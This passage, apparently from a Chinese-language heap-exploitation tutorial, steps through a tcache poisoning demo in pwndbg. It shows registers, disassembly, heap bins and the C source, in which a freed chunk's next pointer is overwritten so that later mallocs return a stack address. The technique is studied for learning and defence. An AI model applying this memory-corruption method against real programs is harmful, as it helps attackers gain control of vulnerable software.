 <span class="err">?</span> <span class="err">0</span><span class="nf">x55555555481a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">192</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x20083f</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x555555554821</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">199</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x555555554825</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">203</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2b4</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555482c</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">210</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x55555555482f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">213</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x555555554834</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">218</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">15</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">a</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c">;</span>
   <span class="err">16</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">17</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Freeing</span> <span class="no">the</span> <span class="no">buffer...</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c">;</span>
   <span class="err">18</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">19</span> 
 <span class="err">?</span> <span class="err">20</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">21</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="nv">%lu</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span>
   <span class="err">22</span>       <span class="err">&quot;</span><span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="nv">%p</span><span class="p">).</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">sizeof</span><span class="p">(</span><span class="no">intptr_t</span><span class="p">),</span> <span class="no">a</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
   <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c">;</span>
   <span class="err">24</span> 
   <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c">;</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapbase</span>
<span class="nf">heapbase</span> <span class="p">:</span> <span class="mi">0x555555756000</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="p">*(</span><span class="no">struct</span> <span class="no">tcache_perthread_struct</span><span class="p">*)</span><span class="mi">0x555555756010</span>
<span class="nf">$3</span> <span class="err">=</span> <span class="err">{</span>
  <span class="nf">counts</span> <span class="err">=</span> <span class="err">&quot;\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">000</span><span class="err">\</span><span class="mi">001</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&#39;\</span><span class="mi">000</span><span class="err">&#39;</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">55</span> <span class="no">times</span><span class="err">&gt;</span><span class="p">,</span>
  <span class="nf">entries</span> <span class="err">=</span> <span class="err">{</span><span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x555555756260</span><span class="p">,</span> <span class="mi">0x0</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">56</span> <span class="no">times</span><span class="err">&gt;}</span>
<span class="err">}</span>
</pre></div>
可以看到，此时第 8 条 tcache 链上已经有了一个 chunk，从 <code>tcache_prethread_struct</code> 结构体中也能得到同样的结论 </p>
<p>然后修改 tcache 的 next
<div class="codehilite"><pre><span></span><span class="nf">pwndbg</span><span class="err">&gt;</span> 
<span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="mi">8</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="mi">0x555555756260</span>
<span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="mi">0x7fffffffdfa8</span><span class="p">).</span>
<span class="err">23</span>      <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x85</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x7ffff7dd48b0</span> <span class="p">(</span><span class="no">_IO_stdfile_2_lock</span><span class="p">)</span> <span class="err">?—</span> <span class="mi">0x0</span>
 <span class="nf">RDI</span>  <span class="mi">0x0</span>
 <span class="nf">RSI</span>  <span class="mi">0x7fffffffb900</span> <span class="err">?—</span> <span class="mi">0x777265766f206557</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">We</span> <span class="no">overw</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nf">R8</span>   <span class="mi">0x7ffff7fd14c0</span> <span class="err">?—</span> <span class="mi">0x7ffff7fd14c0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x8500000000</span>
 <span class="nf">R10</span>  <span class="mi">0x0</span>
 <span class="nf">R11</span>  <span class="mi">0x246</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x555555554867</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">269</span><span class="p">)</span> <span class="err">?—</span> <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
 <span class="err">?</span> <span class="err">0</span><span class="nf">x555555554867</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">269</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x18</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x7ffff7dd48b0</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x55555555486b</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">273</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555486f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">277</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span> <span class="no">rdx</span>
   <span class="err">0</span><span class="nf">x555555554872</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">280</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0x80</span>
   <span class="err">0</span><span class="nf">x555555554877</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">285</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">malloc@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554620</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x55555555487c</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">290</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x55555555487f</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">293</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2007da</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x555555554886</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">300</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2eb</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55555555488d</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">307</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x555555554890</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">310</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x555555554895</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">315</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">18</span>   <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">19</span> 
   <span class="err">20</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">a</span><span class="p">)</span><span class="c">;</span>
   <span class="err">21</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">first</span> <span class="nv">%lu</span> <span class="no">bytes</span> <span class="p">(</span><span class="no">fd</span><span class="err">/</span><span class="no">next</span> <span class="no">pointer</span><span class="p">)</span> <span class="no">of</span> <span class="no">the</span> <span class="no">data</span> <span class="no">at</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span>
   <span class="err">22</span>       <span class="err">&quot;</span><span class="nf">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">the</span> <span class="no">location</span> <span class="no">to</span> <span class="no">control</span> <span class="p">(</span><span class="nv">%p</span><span class="p">).</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">sizeof</span><span class="p">(</span><span class="no">intptr_t</span><span class="p">),</span> <span class="no">a</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
 <span class="err">?</span> <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c">;</span>
   <span class="err">24</span> 
   <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c">;</span>
   <span class="err">26</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c">;</span>
   <span class="err">27</span> 
   <span class="err">28</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c">;</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x555555756260</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
<span class="err">25</span>      <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x555555756260</span> <span class="err">—?</span> <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RDI</span>  <span class="mi">0x0</span>
 <span class="nf">RSI</span>  <span class="mi">0x7fffffffb900</span> <span class="err">?—</span> <span class="mi">0x777265766f206557</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">We</span> <span class="no">overw</span><span class="err">&#39;</span><span class="p">)</span>
 <span class="nf">R8</span>   <span class="mi">0x7ffff7fd14c0</span> <span class="err">?—</span> <span class="mi">0x7ffff7fd14c0</span>
